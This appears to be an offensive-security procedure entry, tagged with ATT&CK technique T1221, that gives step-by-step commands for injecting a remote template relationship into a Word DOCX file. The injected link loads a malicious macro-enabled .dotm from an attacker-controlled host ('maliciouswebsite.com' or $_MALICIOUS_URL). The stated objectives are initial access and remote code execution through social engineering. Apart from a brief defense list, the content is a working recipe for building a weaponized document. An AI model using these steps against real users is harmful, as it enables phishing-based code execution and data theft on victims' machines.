---
id: 3947ac7e-489a-4d18-90a0-e9e189935658
name: Create-DOCX-with-Remote-Template-Injection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:23.902684+00:00'
updated_at: '2024-01-01T00:00:00Z'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - '[[techniques/Office Application Startup|T1221 - Office Application Startup]]'
sub_techniques: []
tags:
  - docx-template-injection
  - office-attacks
  - remote-template
  - macro-execution
commands:
  - '[[commands/generate-external-template-rels-xml]]'
  - '[[commands/check-docx-for-external-template-attachment]]'
platforms:
  - Windows
  - Office
tools: []
validated: true
---

# Create-DOCX-with-Remote-Template-Injection

## Summary

This procedure outlines how to modify a Microsoft Word (.docx) file to include a remote template relationship that loads a malicious macro-enabled template (.dotm) from an attacker-controlled server when the document is opened in Word. This enables remote code execution if the user enables content/macros, serving as an initial access vector through social engineering via email attachments.

## Description

DOCX files are ZIP archives containing XML files that define document structure and relationships. By editing the settings.xml.rels file in the word/_rels directory, an attacker can define an external attachedTemplate relationship pointing to a remote .dotm file containing malicious VBA macros. When the victim opens the DOCX in Microsoft Word and enables editing/content, Word automatically downloads and applies the remote template, executing the macros. This technique bypasses some macro restrictions by leveraging template loading and is effective against users with macro-enabled environments. It requires hosting the malicious .dotm on a controllable web server and targets Windows systems with Microsoft Office.

## Requirements

1. A base .docx file (benign document to modify).
2. Zip/unzip tools (available on Linux/macOS/Windows).
3. A hosted malicious .dotm template file on an attacker-controlled server (e.g., via Apache/Nginx).
4. Basic file editing permissions on the build machine.
5. Knowledge of VBA for creating the .dotm (not covered here).

## Defense

- Educate users on the dangers of opening attachments or enabling macros from unknown sources.
- Use email filters to block emails with suspicious attachments.
- Use endpoint protection software to detect and prevent the execution of malicious macros.
- Configure Office to block external template loading (Group Policy: Block loading of remote templates).
- Scan documents for external relationships using tools like oledump or officeparser.

## Objectives

1. Gain initial access to the target system via social engineering.
2. Execute code remotely through macro activation.
3. Access sensitive information stored on the target system.

## Instructions

### Step 1: Extract the DOCX Archive

**Context**: DOCX files are ZIP archives, so unzip the base document to access and modify internal XML files. This step prepares the structure for injecting the malicious relationship.

```bash
unzip base.docx -d extracted_docx/
```

> Expected output: A directory 'extracted_docx' containing folders like [Content_Types].xml, _rels, docProps, and word. Verify by listing files: ls extracted_docx/word/_rels/ (settings.xml.rels may or may not exist).

### Step 2: Generate the Malicious Relationships XML

**Context**: Create or overwrite the settings.xml.rels file with XML defining the external template relationship. This links the document to the remote malicious .dotm, which will be loaded on open.

**Code** ([[codes/DOCX-External-Template-Relationship-XML]]):

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://maliciouswebsite.com/macro.dotm" TargetMode="External"/>
</Relationships>
```

> Copy the code into a file and place it at extracted_docx/word/_rels/settings.xml.rels. If the file exists, append the <Relationship> element with a unique Id (e.g., rId3) to avoid conflicts. This step injects the remote link.

**Command** ([[commands/generate-external-template-rels-xml]]):

Use the command below after extracting, ensuring you're in the extracted_docx directory.

```bash
echo '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="$_MALICIOUS_URL" TargetMode="External"/></Relationships>' > word/_rels/settings.xml.rels
```

> This overwrites/creates the rels file with the external template. Replace $_MALICIOUS_URL with your hosted .dotm path. Expected: File created without errors.

### Step 3: Repackage the DOCX

**Context**: Re-zip the modified contents to create the final malicious .docx. This seals the injection for delivery.

```bash
cd extracted_docx
zip -r ../malicious.docx *
```

> Expected output: malicious.docx created. Test by opening in Word (do not enable macros) and checking Document Inspector or unzipping again to verify the rels file.

### Step 4: Verify the Injection

**Context**: Confirm the external template relationship is present without fully opening in Word, to avoid accidental execution during testing.

**Command** ([[commands/check-docx-for-external-template-attachment]]):

```bash
unzip -p malicious.docx word/_rels/settings.xml.rels | grep -i "attachedTemplate\|Target"
```

> This extracts and greps for template indicators. Expected: Output showing Type="...attachedTemplate" and Target="http://..." confirming the remote link.
